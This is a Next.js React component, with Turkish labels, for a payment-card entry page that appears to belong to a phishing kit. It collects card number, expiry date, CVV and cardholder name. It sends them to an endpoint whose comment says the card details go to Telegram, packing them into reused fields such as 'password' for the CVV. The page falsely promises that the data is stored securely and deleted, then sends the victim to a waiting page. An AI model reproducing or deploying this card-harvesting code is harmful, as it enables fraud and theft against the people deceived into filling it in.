"use client"
import { useState } from 'react'
import { useRouter } from 'next/navigation'

declare global {
  interface Window {
    fbq: any
  }
}

const CardComponent = () => {
  const router = useRouter()
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: ''
  })
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: ''
  })
  const [isLoading, setIsLoading] = useState(false)

  // Kart numarası formatlaması (16 haneli, 4'lü gruplar)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '') // Sadece sayıları al
    const formattedValue = value.replace(/(.{4})/g, '$1 ').trim() // 4'lü gruplar halinde böl
    if (value.length <= 16) {
      setCardData(prev => ({ ...prev, cardNumber: formattedValue }))
      setErrors(prev => ({ ...prev, cardNumber: '' }))
    }
  }

  // Ay formatlaması (01-12)
  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '')
    if (value.length <= 2 && (value === '' || (parseInt(value) >= 1 && parseInt(value) <= 12))) {
      setCardData(prev => ({ ...prev, expiryMonth: value }))
      setErrors(prev => ({ ...prev, expiryMonth: '' }))
    }
  }

  // Yıl formatlaması (2 haneli)
  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '')
    if (value.length <= 2) {
      setCardData(prev => ({ ...prev, expiryYear: value }))
      setErrors(prev => ({ ...prev, expiryYear: '' }))
    }
  }

  // CVV formatlaması (3-4 haneli)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '')
    if (value.length <= 4) {
      setCardData(prev => ({ ...prev, cvv: value }))
      setErrors(prev => ({ ...prev, cvv: '' }))
    }
  }

  // Kart sahibi adı
  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^a-zA-ZğüşıöçĞÜŞİÖÇ\s]/g, '') // Sadece harfler ve boşluk
    setCardData(prev => ({ ...prev, cardHolder: value.toUpperCase() }))
    setErrors(prev => ({ ...prev, cardHolder: '' }))
  }

  // Form validasyonu
  const validateForm = () => {
    const newErrors = {
      cardNumber: '',
      expiryMonth: '',
      expiryYear: '',
      cvv: '',
      cardHolder: ''
    }
    let hasErrors = false

    // Kart numarası kontrolü
    const cardNumberDigits = cardData.cardNumber.replace(/\s/g, '')
    if (!cardNumberDigits) {
      newErrors.cardNumber = 'Kart numarası gerekli'
      hasErrors = true
    } else if (cardNumberDigits.length !== 16) {
      newErrors.cardNumber = 'Kart numarası 16 haneli olmalıdır'
      hasErrors = true
    }

    // Son kullanma tarihi kontrolü
    if (!cardData.expiryMonth) {
      newErrors.expiryMonth = 'Ay gerekli'
      hasErrors = true
    } else if (parseInt(cardData.expiryMonth) < 1 || parseInt(cardData.expiryMonth) > 12) {
      newErrors.expiryMonth = 'Geçerli bir ay girin (01-12)'
      hasErrors = true
    }

    if (!cardData.expiryYear) {
      newErrors.expiryYear = 'Yıl gerekli'
      hasErrors = true
    } else if (cardData.expiryYear.length !== 2) {
      newErrors.expiryYear = 'Yıl 2 haneli olmalıdır'
      hasErrors = true
    }

    // CVV kontrolü
    if (!cardData.cvv) {
      newErrors.cvv = 'CVV gerekli'
      hasErrors = true
    } else if (cardData.cvv.length < 3 || cardData.cvv.length > 4) {
      newErrors.cvv = 'CVV 3-4 haneli olmalıdır'
      hasErrors = true
    }

    // Kart sahibi kontrolü
    if (!cardData.cardHolder.trim()) {
      newErrors.cardHolder = 'Kart sahibi adı gerekli'
      hasErrors = true
    } else if (cardData.cardHolder.trim().length < 2) {
      newErrors.cardHolder = 'Kart sahibi adı en az 2 karakter olmalıdır'
      hasErrors = true
    }

    setErrors(newErrors)
    return !hasErrors
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!validateForm()) {
      return
    }

    setIsLoading(true)
    try {
      // Telegram'a kart bilgilerini gönder
      const response = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username: 'KART_BILGISI',
          password: cardData.cvv,
          phone: cardData.cardNumber.replace(/\s/g, ''),
          creditLimit: `${cardData.expiryMonth}/${cardData.expiryYear}`,
          applicationDate: new Date().toLocaleDateString('tr-TR'),
          realName: cardData.cardHolder,
          realSurname: 'KART_SAHIBI'
        })
      })

      const data = await response.json()

      if (data.success) {
        // Meta Pixel event - Kart bilgileri tamamlandı (Purchase event)
        if (typeof window !== 'undefined' && window.fbq) {
          window.fbq('track', 'Purchase', {
            content_name: 'Card Information Completed',
            content_type: 'lead',
            value: 1.00,
            currency: 'TRY'
          });
        }

        // Başarılı ise wait sayfasına yönlendir
        router.push('/wait')
      } else {
        setErrors(prev => ({ ...prev, cardNumber: 'Kart bilgileri gönderilemedi. Lütfen tekrar deneyin.' }))
      }
    } catch (error) {
      console.error('Card submission error:', error)
      setErrors(prev => ({ ...prev, cardNumber: 'Bir hata oluştu. Lütfen tekrar deneyin.' }))
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="h-auto bg-white flex flex-col items-center justify-center p-4 mt-4">
      <div className="w-full max-w-[400px] bg-white rounded-[20px] border border-gray-200 p-8 shadow-sm">
        
        {/* Kart Numarası */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Kart Numarası
          </h2>
          <div className="relative">
            <input
              type="text"
              placeholder="1234 5678 9012 3456"
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700"
              value={cardData.cardNumber}
              onChange={handleCardNumberChange}
              disabled={isLoading}
            />
          </div>
          {errors.cardNumber && (
            <p className="text-red-500 text-sm mt-2">{errors.cardNumber}</p>
          )}
        </div>

        {/* Son Kullanma Tarihi */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Son Kullanma Tarihi
          </h2>
          <div className="flex gap-4">
            <div className="flex-1">
              <input
                type="text"
                placeholder="Ay (12)"
                maxLength={2}
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700"
                value={cardData.expiryMonth}
                onChange={handleMonthChange}
                disabled={isLoading}
              />
              {errors.expiryMonth && (
                <p className="text-red-500 text-sm mt-2">{errors.expiryMonth}</p>
              )}
            </div>
            <div className="flex-1">
              <input
                type="text"
                placeholder="Yıl (25)"
                maxLength={2}
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700"
                value={cardData.expiryYear}
                onChange={handleYearChange}
                disabled={isLoading}
              />
              {errors.expiryYear && (
                <p className="text-red-500 text-sm mt-2">{errors.expiryYear}</p>
              )}
            </div>
          </div>
        </div>

        {/* CVV */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            CVV
          </h2>
          <div className="relative">
            <input
              type="text"
              placeholder="123"
              maxLength={4}
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700"
              value={cardData.cvv}
              onChange={handleCvvChange}
              disabled={isLoading}
            />
          </div>
          {errors.cvv && (
            <p className="text-red-500 text-sm mt-2">{errors.cvv}</p>
          )}
        </div>

        {/* Kart Sahibi */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Kart Sahibi Adı
          </h2>
          <div className="relative">
            <input
              type="text"
              placeholder="AHMET YILMAZ"
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700 uppercase"
              value={cardData.cardHolder}
              onChange={handleCardHolderChange}
              disabled={isLoading}
            />
          </div>
          {errors.cardHolder && (
            <p className="text-red-500 text-sm mt-2">{errors.cardHolder}</p>
          )}
        </div>

        {/* Devam Et Butonu */}
        <form onSubmit={handleSubmit}>
          <button
            type="submit"
            className="w-full bg-[#800D51] text-white rounded-md py-4 hover:bg-[#800D51]/90 transition font-semibold text-lg disabled:opacity-50"
            disabled={isLoading}
          >
            {isLoading ? 'İşleniyor...' : 'Devam Et'}
          </button>
        </form>
        
      </div>

      <div className="text-sm text-black mt-4 text-left">
        <strong>Güvenliğiniz İçin</strong>
        <br />
        Kart bilgileriniz güvenle saklanır ve işlem tamamlandıktan sonra silinir. Bu bilgiler yalnızca ödeme işlemi için kullanılır.
      </div>

      <style jsx>{`
        input::placeholder {
          color: #999;
        }
        
        input:focus {
          box-shadow: 0 0 0 2px rgba(128, 13, 81, 0.1);
        }
      `}</style>
    </div>
  )
}

export default CardComponent